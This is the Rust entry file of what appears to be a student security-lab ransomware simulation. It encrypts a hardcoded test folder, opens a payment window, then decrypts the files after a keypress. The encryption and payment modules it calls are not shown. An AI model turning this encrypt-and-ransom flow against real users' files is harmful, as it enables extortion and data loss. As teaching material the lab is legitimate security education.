mod cryptography;
mod payment;
use cryptography::encrypt::{ generate_key, encrypt_file, decrypt_file };
mod ransomware;

use ransomware::fileEncrypt::FileEncryptor;
use std::path::Path;
use std::io;

fn main() -> anyhow::Result<()> {
    let encryptor = FileEncryptor::new();
    
    // Path to my exampleFrankenstein folder
    let folder_path = Path::new(r"c:\Users\20231136\Desktop\lab for sec\Frankenstein"); //THIS PATH MUST BE ADJUSTED BASED ON WHERE THE FOLDER IS LOCATED ON YOUR SYSTEM , TODO
    
    println!("Encrypting Frankenstein folder...");
    encryptor.encrypt_folder(folder_path)?;
    
    println!("Encryption complete! Files are now encrypted.");
    payment::show_payment_window();
    println!("Press Enter to proceed to decryption...");
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;

    println!("Attempting to decrypt using the private key...");
    match encryptor.decrypt_folder(folder_path) {
        Ok(()) => println!("Decryption successful! You get your files back now"),
        Err(e) => println!("Decryption failed: {}", e),
    }
    
    Ok(())
}
